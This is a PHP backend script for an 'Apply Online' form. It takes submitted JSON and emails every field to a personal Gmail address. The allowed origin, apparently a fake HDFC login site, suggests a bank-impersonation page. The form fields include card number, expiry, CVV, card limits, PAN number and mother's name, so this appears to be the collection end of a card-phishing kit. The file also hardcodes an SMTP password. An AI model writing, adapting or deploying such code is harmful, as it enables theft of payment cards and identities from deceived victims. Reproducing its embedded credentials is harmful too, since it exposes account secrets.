<?php
/**
 * Receives the Apply Online form data (JSON) from the Angular app
 * and emails it to the configured address before OTP verification.
 *
 * Upload this file to your hosting next to the Angular build (same folder
 * as index.html), so the URL 'send-application.php' resolves correctly.
 *
 * Two ways to send:
 *   1. PHP mail()            -> no password needed (default)
 *   2. SMTP via PHPMailer    -> more reliable; set $USE_SMTP = true and fill SMTP details
 *      (install with: composer require phpmailer/phpmailer)
 */

date_default_timezone_set('Asia/Kolkata');

// ================= CONFIG =================
$TO_EMAIL   = 'amirkhan20055555@gmail.com';
$FROM_EMAIL = 'contact@eklavyaoverseas.com';   // MUST be a real mailbox on the SAME domain this file is hosted on
$FROM_NAME  = 'Online Application';
$SUBJECT    = 'New Online Application';

// Only your site may call this file (add http://localhost:4200 while testing locally)
$ALLOWED_ORIGINS = [
    'https://loginhdfc.vercel.app/',
    'https:www.loginhdfc.vercel.app/',
];

// ---- SMTP (optional, recommended) ----
$USE_SMTP  = false;                        // true karein agar SMTP use karna hai
$SMTP_HOST = 'mail.loginhdfc.vercel.ap';    // hosting panel > Email Accounts > Connect devices
$SMTP_USER = 'contact@eklavyaoverseas.com';
$SMTP_PASS = 'khansahad1234@';
$SMTP_PORT = 465;                          // 465 = SSL, 587 = TLS
// ==========================================

// Errors go to a log file, never into the JSON response
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', __DIR__ . '/mail-error.log');

// ---- CORS / headers ----
header('Content-Type: application/json; charset=UTF-8');
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (in_array($origin, $ALLOWED_ORIGINS, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header('Vary: Origin');
}
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

function respond(int $code, bool $success, string $message): void
{
    http_response_code($code);
    echo json_encode(['success' => $success, 'message' => $message]);
    exit;
}

$method = $_SERVER['REQUEST_METHOD'] ?? '';
if ($method === 'OPTIONS') {
    http_response_code(204);
    exit;
}
if ($method !== 'POST') {
    respond(405, false, 'Method not allowed');
}

// ---- Read JSON body ----
$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!is_array($data) || empty($data)) {
    respond(400, false, 'No data received');
}

// ---- Basic validation ----
$applicantEmail = trim((string) ($data['email'] ?? ''));
if ($applicantEmail !== '' && !filter_var($applicantEmail, FILTER_VALIDATE_EMAIL)) {
    respond(422, false, 'Invalid email address');
}
if (empty($data['fullName']) || empty($data['mobile'])) {
    respond(422, false, 'Full name and mobile number are required');
}

// ---- Friendly labels for known fields ----
$labels = [
    'fullName'       => 'Full Name',
    'motherName'     => "Mother's Name",
    'mobile'         => 'Mobile Number',
    'email'          => 'Email',
    'dob'            => 'Date of Birth',
    'city'           => 'City',
    'address'        => 'Address',
    'pincode'        => 'Pincode',
    'panNumber'      => 'PAN Number',
    'agree'          => 'Agreed to Terms',
   
    'cardNumber'     => 'Card Number',
    'totalLimit'     => 'Total Limit',
    'availableLimit' => 'Available Limit',
    'expiry'         => 'Card Expiry',
    'cvv'            => 'CVV',
];

// Converts any value (bool / array / null) into readable text
function toText($value): string
{
    if (is_bool($value))  return $value ? 'Yes' : 'No';
    if ($value === null)  return '-';
    if (is_array($value)) return implode(', ', array_map('toText', $value));
    return trim((string) $value);
}

// ---- Build email body (HTML + plain text) ----
$rows = '';
$text = "New Online Application\nReceived: " . date('d/m/Y H:i:s') . "\n\n";

foreach ($data as $key => $value) {
    $label   = $labels[$key] ?? ucfirst(preg_replace('/([a-z])([A-Z])/', '$1 $2', (string) $key));
    $valText = toText($value);

    $safeLabel = htmlspecialchars($label, ENT_QUOTES, 'UTF-8');
    $safeValue = nl2br(htmlspecialchars($valText, ENT_QUOTES, 'UTF-8'));

    $rows .= "<tr><td style='padding:6px 12px;border:1px solid #ddd;font-weight:bold;'>{$safeLabel}</td>"
           . "<td style='padding:6px 12px;border:1px solid #ddd;'>{$safeValue}</td></tr>\r\n"; // line break: mail lines must stay < 998 chars
    $text .= "{$label}: {$valText}\n";
}

$htmlBody = "<h2>New Online Application</h2>"
          . "<p>Received: " . date('d/m/Y H:i:s') . "</p>"
          . "<table style='border-collapse:collapse;font-family:Arial,sans-serif;font-size:14px;'>{$rows}</table>";

$replyName = preg_replace('/[\r\n"<>]/', '', toText($data['fullName'] ?? ''));

// ================= SEND =================
$sent = false;

if ($USE_SMTP) {
    // ---- Option 2: SMTP via PHPMailer ----
    $autoload = __DIR__ . '/vendor/autoload.php';
    if (!file_exists($autoload)) {
        error_log('PHPMailer not installed: vendor/autoload.php missing');
        respond(500, false, 'Mail could not be sent from the server');
    }
    require $autoload;

    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host       = $SMTP_HOST;
        $mail->SMTPAuth   = true;
        $mail->Username   = $SMTP_USER;
        $mail->Password   = $SMTP_PASS;
        $mail->Port       = $SMTP_PORT;
        $mail->SMTPSecure = ($SMTP_PORT === 465)
            ? PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS
            : PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS;
        $mail->CharSet    = 'UTF-8';

        $mail->setFrom($FROM_EMAIL, $FROM_NAME);
        $mail->addAddress($TO_EMAIL);
        if ($applicantEmail !== '') {
            $mail->addReplyTo($applicantEmail, $replyName);
        }

        $mail->isHTML(true);
        $mail->Subject = $SUBJECT;
        $mail->Body    = $htmlBody;
        $mail->AltBody = $text;

        $sent = $mail->send();
    } catch (Throwable $e) {
        error_log('SMTP error: ' . $mail->ErrorInfo . ' | ' . $e->getMessage());
        $sent = false;
    }
} else {
    // ---- Option 1: PHP mail() (no password) ----
    $boundary = 'b' . bin2hex(random_bytes(12));

    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "From: {$FROM_NAME} <{$FROM_EMAIL}>\r\n";
    if ($applicantEmail !== '') {
        $headers .= "Reply-To: {$replyName} <{$applicantEmail}>\r\n";
    }
    $headers .= "Content-Type: multipart/alternative; boundary=\"{$boundary}\"\r\n";

    $body  = "--{$boundary}\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n{$text}\r\n";
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Type: text/html; charset=UTF-8\r\n\r\n{$htmlBody}\r\n";
    $body .= "--{$boundary}--";

    $encodedSubject = '=?UTF-8?B?' . base64_encode($SUBJECT) . '?=';

    // "-f" sets the Return-Path to your real mailbox -> much better delivery to Gmail
    $sent = mail($TO_EMAIL, $encodedSubject, $body, $headers, '-f' . $FROM_EMAIL);

    if (!$sent) {
        $err = error_get_last();
        error_log('mail() failed: ' . ($err['message'] ?? 'unknown error'));
    }
}

if ($sent) {
    respond(200, true, 'Application details sent');
}
respond(500, false, 'Mail could not be sent from the server');
